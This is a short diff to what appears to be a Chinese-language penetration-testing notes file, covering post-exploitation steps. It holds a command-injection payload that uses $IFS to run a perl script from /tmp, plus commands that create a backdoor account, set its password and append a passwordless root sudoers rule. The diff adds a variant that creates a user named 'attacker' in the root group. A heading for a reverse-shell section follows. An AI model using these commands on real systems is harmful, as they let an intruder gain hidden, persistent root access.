@@ -634,8 +634,10 @@ public interface UserMapper {
     1. 执行脚本: `xxx$(perl$IFS"/tmp/hhack.pl")`
 
 1. 找到可以提权到root的脚本, 创建帐号, 设置密码, 添加权限
-    ```sh
-    useradd xxx;echo password | passwd xxx --stdin &>/dev/null;echo "xxx ALL=(root) NOPASSWD: ALL" >> /etc/sudoers
+    ```bash
+    $ useradd xxx;echo password | passwd xxx --stdin &>/dev/null;echo "xxx ALL=(root) NOPASSWD: ALL" >> /etc/sudoers
+    # 或
+    $ useradd -u 999 -g 0 -G 0 attacker && echo -e "password\npassword\n" | passwd attacker
     ```
 
 ### 反弹shell
